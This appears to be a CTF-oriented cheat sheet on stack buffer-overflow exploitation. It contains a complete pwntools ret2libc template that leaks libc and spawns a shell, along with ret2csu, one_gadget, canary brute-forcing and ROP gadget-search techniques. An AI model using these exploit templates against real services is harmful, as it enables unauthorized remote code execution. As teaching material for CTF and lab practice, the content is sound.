# Stack Exploitation (Stack Pwn)

## Trigger conditions and prerequisite checks

### Interpreting checksec

```bash
checksec --file=./vuln
# or pwntools' built-in
python -c "from pwn import *; print(ELF('./vuln'))"
```

| Output field | Impact | Response |
|---------|------|------|
| `NX disabled` | Stack executable | Just inject shellcode |
| `Canary found` | Stack overflow is detected | Must first leak the canary or bypass it (forked process / format string) |
| `PIE enabled` | .text base randomized | Must leak a code address |
| `No PIE` | .text fixed | Gadget addresses can be hardcoded |
| `Full RELRO` | got not writable | Can't modify got; go ret2libc / one_gadget |
| `Partial RELRO` | got writable | Can modify the got table |
| `FORTIFY` | Some libc functions replaced with `_chk` versions | `read_chk` can still overflow, `strcpy_chk` cannot |

### Precisely locating the stack overflow length

```python
# pwntools cyclic mode
from pwn import *
context.arch = 'amd64'

# 1. generate a cyclic pattern
payload = cyclic(200)

# 2. feed it to the program to trigger a crash
p = process('./vuln')
p.sendline(payload)
p.wait()

# 3. read the value at RSP from the core dump
core = p.corefile
fault = core.fault_addr  # or the 8 bytes pointed to by core.rsp
offset = cyclic_find(fault & 0xffffffff)  # 32-bit mode
# for 64-bit use cyclic_find(p64(fault)[:8])
log.info(f"offset = {offset}")
```

### 32 / 64-bit calling convention quick reference

| Architecture | Argument passing | Return | Note |
|------|---------|------|------|
| x86 (32-bit) | Args passed on the stack (cdecl: caller cleans up) | eax | Stack layout: ret_addr, arg1, arg2, ... |
| x86-64 SysV | rdi, rsi, rdx, rcx, r8, r9, stack | rax | rsp must be 16-byte aligned at the call entry |
| ARM32 | r0-r3, stack | r0 | lr holds the return address, bx lr returns |
| ARM64 | x0-x7, stack | x0 | Similar to SysV, stricter alignment |

## Complete ret2libc pwntools template

```python
#!/usr/bin/env python3
from pwn import *

# === Environment configuration ===
exe = './vuln'
libc_path = './libc.so.6'
HOST, PORT = 'chal.example.com', 31337

context.binary = elf = ELF(exe)
context.log_level = 'info'
libc = ELF(libc_path)

# auto-patchelf so local runs use the challenge's libc
# patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vuln

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(exe, gdbscript='''
            b *main+123
            continue
        ''')
    return process(exe)

# === Stage 1: leak libc ===
p = conn()

OFFSET = 0x48  # measured via cyclic
pop_rdi = 0x0000000000401383  # ROPgadget --binary ./vuln --only "pop|ret" | grep rdi
ret     = 0x000000000040101a  # used for stack alignment

payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])     # make puts print the address of puts@got itself
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])     # return to main, reuse the stack overflow for a second round

p.sendlineafter(b'> ', payload)

# receive the leak (note the recvuntil anchor string, don't use sleep)
p.recvuntil(b'bye\n')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'leaked puts @ {hex(leak)}')

# reverse-lookup the libc base
libc.address = leak - libc.sym['puts']
log.success(f'libc base = {hex(libc.address)}')

# === Stage 2: ret2libc system("/bin/sh") ===
binsh    = next(libc.search(b'/bin/sh\x00'))
system   = libc.sym['system']

payload  = b'A' * OFFSET
payload += p64(ret)        # key: fix the 16-byte alignment
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b'> ', payload)

p.interactive()
```

### Stack alignment pitfall (must read)

```text
Symptom: works locally, but remotely SIGSEGVs as soon as it enters system
Cause: libc's system → do_system → somewhere inside, movaps xmm0, [rsp]
       requires rsp to be 16-byte aligned
Failure: when your ROP chain jumps into system, the low nibble of rsp is 0x8 instead of 0x0
Fix: insert a `ret` gadget into the ROP chain (consumes 8 bytes, realigns rsp)
```

## ret2csu (universal gadget)

When the binary lacks a third-argument gadget like `pop rdx; ret`, use the fixed structure inside `__libc_csu_init` (present in statically linked programs with glibc < 2.34).

```text
__libc_csu_init fixed tail pattern:
    add  rsp, 8
    pop  rbx
    pop  rbp
    pop  r12
    pop  r13
    pop  r14
    pop  r15
    ret

Middle also has:
    mov  rdx, r15  ; r15 → rdx
    mov  rsi, r14  ; r14 → rsi
    mov  edi, r13d ; r13 → rdi (low 32 bits)
    call qword ptr [r12 + rbx*8]
```

pwntools usage:

```python
csu_pop = 0x40119a  # first part (pop rbx..r15; ret)
csu_call = 0x401180  # second part (mov rdx,r15; ... ; call [r12+rbx*8])

def csu(rdi, rsi, rdx, call_target):
    p  = p64(csu_pop)
    p += p64(0)              # rbx = 0
    p += p64(1)              # rbp = 1 (so the later cmp rbx,rbp passes → rbx+1 == rbp)
    p += p64(call_target)    # r12 = dereference [r12+rbx*8] to get the target
    p += p64(rdi)            # r13
    p += p64(rsi)            # r14
    p += p64(rdx)            # r15
    p += p64(csu_call)
    p += b'\x00' * 8 * 7     # after the second part's ret, pop another 7
    return p
```

Use: write a function pointer into bss and call it with csu; commonly used to jump to bss and execute ROP after a `read(0, bss, 0x100)` stage.

## one_gadget usage

```bash
one_gadget ./libc.so.6

# output similar to:
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
```

Usage:

```python
og = [0xe3afe, 0xe3b01, 0xe3b04]
payload  = b'A' * OFFSET
payload += p64(ret)
payload += p64(libc.address + og[1])  # pick the one whose constraints can be satisfied
```

**Pitfall**: in some libc versions (2.34+) one_gadget's constraints are extremely hard to satisfy; plain ret2libc is more reliable.

## libc-database reverse-lookup

Scenario: the challenge provides no libc, so you can only leak a few function addresses and infer the version.

```bash
cd ~/tools/libc-database

# reverse-lookup using the leaked puts and read addresses (take the last 3 digits)
./find puts 0x6f0 read 0xfd
# output: libc6_2.31-0ubuntu9.9_amd64

# get all symbol offsets of the corresponding libc
./dump libc6_2.31-0ubuntu9.9_amd64

# download the actual libc.so.6 locally
ls db/libc6_2.31-0ubuntu9.9_amd64.so
```

pwntools integration:

```python
# online libc-database query (no local setup needed)
from pwnlib.libcdb import search_by_symbol_offsets
libs = search_by_symbol_offsets({'puts': 0x6f0, 'read': 0xfd})
libc = ELF(libs[0])
```

## ROPgadget quick reference

```bash
# basic: pop|ret for a single reg
ROPgadget --binary ./vuln --only "pop|ret"

# find syscall
ROPgadget --binary ./vuln | grep ': syscall'

# find with specific bytes
ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep 'pop rdi'

# find strings
ROPgadget --binary ./libc.so.6 --string '/bin/sh'

# output JSON for a program to parse
ROPgadget --binary ./vuln --json > gadgets.json
```

Ropper alternative (broader architecture support):

```bash
ropper --file ./vuln --search "pop rdi; ret"
ropper --file ./libc.so.6 --search "syscall"
```

## Remote stabilization checklist

| Problem | Symptom | Solution |
|------|------|------|
| Wrong libc version | Works locally, SIGSEGV in system remotely | After leaking, use libc-database to reverse-lookup the actual version |
| Stack alignment | Immediate segfault in system | Add a `ret` gadget |
| Network latency | recv only gets half | Use `recvuntil(b'anchor string')`, not `sleep` |
| Buffering | No response after sendline | Switch to `sendlineafter`, explicitly wait for the prompt before sending |
| ASLR jitter | Probabilistic success | Check whether byte-level brute force is needed (a 1/16 probability doesn't count as stable) |
| TCP Nagle | Small packets coalesced | Fall back to `p.settimeout(2); p.recvall(timeout=2)` |

## Debugging tips

```python
# pwntools embedded gdb attach
p = process('./vuln')
gdb.attach(p, '''
    b *main+0x123
    b *0x401234
    commands
        telescope $rsp 20
        continue
    end
''')

# run inside gdb from the start
p = gdb.debug('./vuln', '''
    set follow-fork-mode child
    b main
''')
```

Common GEF/pwndbg commands:

```text
checksec               # check protections
vmmap                  # memory layout
telescope $rsp 30      # stack chain (pwndbg)
stack 30               # similar (GEF)
got                    # GOT table
search-pattern "/bin/sh"
context                # automatically shows reg + stack + code (on by default)
ropgadget              # embedded gadget search
```

## Notes

- Only with **NX off + ASLR off** can you use shellcode directly; modern binaries almost always have NX on
- **The canary doesn't change in forked child processes** — a forking server can be brute-forced byte by byte (1/256 × 7 bytes)
- **A format string can leak both the canary and libc** — use `%p %p ... %p` to scan the stack
- **DynELF is slow but universal** — when no libc is provided at all, pwntools' `DynELF` can leak the symbol table byte by byte using only the program's own IO primitives
- **Statically linked programs have no libc.got** — use SROP (sigreturn-oriented programming) or direct syscalls
